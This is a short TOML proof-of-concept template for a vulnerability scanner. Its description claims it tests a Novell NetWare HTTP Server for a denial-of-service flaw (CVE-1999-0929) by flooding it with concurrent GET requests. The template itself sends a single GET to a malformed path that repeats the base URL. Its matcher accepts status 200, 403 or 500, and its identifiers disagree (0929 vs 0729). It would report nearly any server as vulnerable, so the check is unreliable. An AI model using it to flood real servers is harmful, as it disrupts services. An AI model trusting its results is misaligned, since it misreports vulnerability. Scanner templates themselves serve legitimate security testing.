[info]
author = "ave"
description = "通过发送大量并发 HTTP GET 请求耗尽 Novell NetWare HTTP Server 连接池与处理资源，验证服务器是否存在拒绝服务漏洞"
id = "POC-AVE-1999-0729"
name = "Novell NetWare HTTP Server DoS PoC"
severity = "medium"
tags = ["ave-1999-0729"]
vuln_id = [
    "CVE-1999-0929",
    "AVE-1999-0729",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    403,
    500,
]
type = "status"
